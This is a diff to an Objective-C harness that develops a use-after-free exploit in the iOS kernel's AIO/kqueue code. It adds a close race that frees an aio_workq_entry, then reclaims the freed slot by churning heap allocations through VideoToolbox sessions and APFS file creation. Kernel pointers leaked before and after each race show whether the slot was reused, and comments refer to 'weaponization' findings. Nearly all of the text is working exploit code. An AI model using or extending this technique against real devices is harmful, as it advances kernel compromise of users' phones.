@@ -1,4 +1,5 @@
 #import "AVEOpenSmoke.h"
+#import "P063AioKqueueLeak.h"
 #include "A14_23F77_LabOffsets.h"
 #import "LabDeviceProfile.h"
 #import <CoreFoundation/CoreFoundation.h>
@@ -11341,10 +11342,57 @@ static void *v4_closer(void *arg) {
     return NULL;
 }
 
+/* ==== AIO UAF v5 (2026-11-20; findings 2026-11-20_aio_uaf_23f77_weaponization
+   + _aio_followup_readback_spray): OBSERVATION-FIRST ====
+   The v4c live-spray + spray-armed close(keep) is REMOVED — it forced the
+   second put before anything could be observed. v5: the close race frees the
+   entry (the first put, proven deterministic on two boots), then the reclaim
+   churn runs POST-FREE ONLY — AVE2 S_AVE_TBlkBuf (fresh VTCompressionSession
+   per burst, the 192-class volume leader) + apfs obj_t (container file
+   create/unlink) — never sprayed ahead of the free (the 2026-11-07 rig-panic
+   law). The 84530 oracle witnesses the slot: E1 before the loop, E2 after
+   each race+churn; SAME = deterministic self-recycle, MOVED/none = the freed
+   neighborhood went to the churn. The second put is left to the honest
+   teardown — PANIC-POSSIBLE stays the law, one tap per fresh boot. */
+static void aio_v5_ave_churn(int bursts) {
+    for (int b = 0; b < bursts; b++) {
+        VTCompressionSessionRef s = NULL;
+        if (VTCompressionSessionCreate(NULL, 1280, 720,
+                kCMVideoCodecType_H264, NULL, NULL, NULL,
+                NULL, NULL, &s) != noErr || !s)
+            continue;
+        CVPixelBufferRef pb = NULL;
+        if (CVPixelBufferCreate(NULL, 1280, 720,
+                kCVPixelFormatType_420YpCbCr8Planar, NULL, &pb) == kCVReturnSuccess && pb) {
+            for (int f = 0; f < 8; f++)
+                VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(f, 30), kCMTimeInvalid, NULL, NULL, NULL);
+        }
+        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+        if (pb) CVBufferRelease(pb);
+        VTCompressionSessionInvalidate(s);
+        CFRelease(s);
+    }
+}
+static void aio_v5_apfs_churn(const char *dir, int files) {
+    char p[1024];
+    for (int i = 0; i < files; i++) {
+        snprintf(p, sizeof p, "%s/aio_v5_churn.%d.%d", dir, (int)getpid(), i);
+        int fd = open(p, O_CREAT | O_RDWR | O_TRUNC, 0644);
+        if (fd >= 0) {
+            ssize_t w = write(fd, "v5", 2);
+            (void)w;
+            close(fd);
+        }
+        unlink(p);
+    }
+}
+#define AIO_V5_AVE_BURSTS 6
+#define AIO_V5_FILES 64
+
 + (NSString *)runAIOUAF {
     NSMutableString *out = [NSMutableString string];
     [out appendFormat:@"time %@\n", [NSDate date]];
-    [out appendString:@"=== AIO UAF v4c (S3 + zone CHURN then close(keep)) ===\n"];
+    [out appendString:@"=== AIO UAF v5 (observation-first: race-free + post-free churn + 84530 witness) ===\n"];
     [out appendString:@"NOTE: aio_workq_entry = kalloc_type kt_size=0xb8 (23F77); NOT data.kalloc\n"];
     [out appendFormat:@"churn %d cycles x %d slots, then 7 live doneq, close(keep).\n\n",
         AIO_CHURN, AIO_SPRAY];
@@ -11377,6 +11425,11 @@ static void *v4_closer(void *arg) {
     long n_eagain = 0, n_ok = 0, n_einval = 0, n_eother = 0, n_occ_fail = 0;
     struct aiocb spray[AIO_SPRAY];
     struct aiocb occ;
+
+    /* v5 WITNESS-PRE: the slot the next live entry lands at, before any race */
+    uint64_t e1 = [P063AioKqueueLeak witnessEntryKptr];
+    ALOG("WITNESS-PRE E1=0x%llx\n", (unsigned long long)e1);
+    [out appendFormat:@"  [witness] E1=0x%llx (pre-race slot)\n", (unsigned long long)e1];
 
     for (long it = 0; it < AIO_ITERS; it++) {
         v4_fill_none(&occ);
@@ -11417,25 +11470,21 @@ static void *v4_closer(void *arg) {
             continue;
         }
 
-        if ((it % 5) == 0) {
-            [out appendFormat:@"  it=%ld eagain=%ld churning %d x %d\n",
-                it, n_eagain, AIO_CHURN, AIO_SPRAY];
-            ALOG("it=%ld eagain=%ld start-churn\n", it, n_eagain);
-        }
+        /* v5: POST-FREE reclaim churn ONLY (the v4c drain + live-spray +
+           spray-armed close are REMOVED). AVE2 TBlkBuf (192-class volume
+           leader) + apfs obj_t — never sprayed ahead of the free. */
+        aio_v5_ave_churn(AIO_V5_AVE_BURSTS);
+        aio_v5_apfs_churn(docs.fileSystemRepresentation, AIO_V5_FILES);
 
-        // drain quarantine: alloc+reap, do NOT leave objects live until the end
-        for (int c = 0; c < AIO_CHURN; c++) {
-            v4_burst_alloc(spray, AIO_SPRAY);
-            v4_burst_reap(spray, AIO_SPRAY);
-        }
+        /* v5 WITNESS-POST: where does the next live entry land? */
+        uint64_t e2 = [P063AioKqueueLeak witnessEntryKptr];
+        const char *verdict = (e2 == 0) ? "none" : (e2 == e1 ? "SAME-SLOT (self-recycle)" : "MOVED (churn claimed)");
+        ALOG("it=%ld WITNESS-POST E2=0x%llx %s\n", it, (unsigned long long)e2, verdict);
+        [out appendFormat:@"  it=%ld eagain=%ld E2=0x%llx %s\n",
+            it, n_eagain, (unsigned long long)e2, verdict];
 
-        // final occupants of the zone — leave LIVE on doneq
-        int ns = v4_burst_alloc(spray, AIO_SPRAY);
-        ALOG("it=%ld churn-done spray-armed close(keep) ns=%d eagain=%ld\n",
-             it, ns, n_eagain);
+        /* the honest teardown — the second put may fire from here (PANIC-POSSIBLE) */
         close(keep);
-
-        for (int i = 0; i < AIO_SPRAY; i++) v4_reap(&spray[i]);
     }
 
     g_v4_stop = 1;
@@ -11445,9 +11494,12 @@ static void *v4_closer(void *arg) {
     [out appendFormat:@"\n=== SURVIVED %d iters eagain=%ld ok=%ld einval=%ld other=%ld occ_fail=%ld ===\n",
         AIO_ITERS, n_eagain, n_ok, n_einval, n_eother, n_occ_fail];
     [out appendFormat:@"closes=%ld churn=%d x %d per iter\n", g_v4_closes, AIO_CHURN, AIO_SPRAY];
-    [out appendString:@"PANIC still-enqueued after spray-armed => CHURN reclaimed the knote slot.\n"];
-    [out appendString:@"PANIC os_refcnt underflow => slot still quarantined / churn missed.\n"];
-    ALOG("SURVIVED aio-uaf-v4c eagain=%ld closes=%ld\n", n_eagain, g_v4_closes);
+    [out appendString:@"v5 verdicts: SAME-SLOT = deterministic self-recycle (the zone returns to aio);\n"];
+    [out appendString:@"  MOVED = the freed neighborhood went to the AVE2/apfs churn (claimant at slot+0x2c\n"];
+    [out appendString:@"  prints in any underflow panic rc); none = no live entry (fixed train or drained).\n"];
+    [out appendString:@"PANIC (if it fires) = the second put on the freed/reclaimed slot — the rc value\n"];
+    [out appendString:@"  identifies the claimant type's own +0x2c field. PANIC-POSSIBLE law unchanged.\n"];
+    ALOG("SURVIVED aio-uaf-v5 eagain=%ld closes=%ld\n", n_eagain, g_v4_closes);
     if (logfd >= 0) close(logfd);
     [out appendString:@"\nDONE -- paste this text back\n"];
     return out;
